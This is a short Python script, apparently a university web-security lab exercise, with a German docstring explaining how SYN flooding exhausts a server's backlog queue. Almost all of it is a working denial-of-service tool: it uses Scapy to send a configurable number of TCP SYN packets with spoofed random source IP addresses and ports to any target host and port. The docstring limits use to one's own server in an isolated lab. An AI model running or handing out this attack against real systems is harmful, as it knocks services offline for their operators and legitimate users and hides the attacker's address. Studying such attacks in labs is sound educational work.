#!/usr/bin/env python3
"""TCP-SYN-Flooding mit Scapy (Praktikum Web-Security, Aufgabe 1).

Sendet TCP-SYN-Pakete mit zufaelliger Quell-IP und zufaelligem Quell-Port an
den Zielserver. Der Server legt fuer jedes SYN einen halboffenen Eintrag in
seiner Backlog-Queue an und antwortet mit SYN/ACK. Da die gespoofte Quell-IP
nie ein ACK schickt, bleibt der Eintrag bis zum Timeout bestehen. Genug SYNs
fuellen die Queue, sodass echte Clients keine Verbindung mehr aufbauen koennen.

Nur in einer isolierten Laborumgebung gegen den EIGENEN Server einsetzen.
"""
import argparse
import random
from scapy.all import IP, TCP, send

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-c", "--count", type=int, default=1000,
                    help="Anzahl SYNs (Labor: bewusst begrenzt)")
    args = ap.parse_args()

    for _ in range(args.count):
        pkt = IP(src=random_ip(), dst=args.target) / \
              TCP(sport=random.randint(1024, 65535), dport=args.port, flags="S")
        send(pkt, verbose=0)
    print(f"{args.count} SYN-Pakete an {args.target}:{args.port} gesendet")

if __name__ == "__main__":
    main()
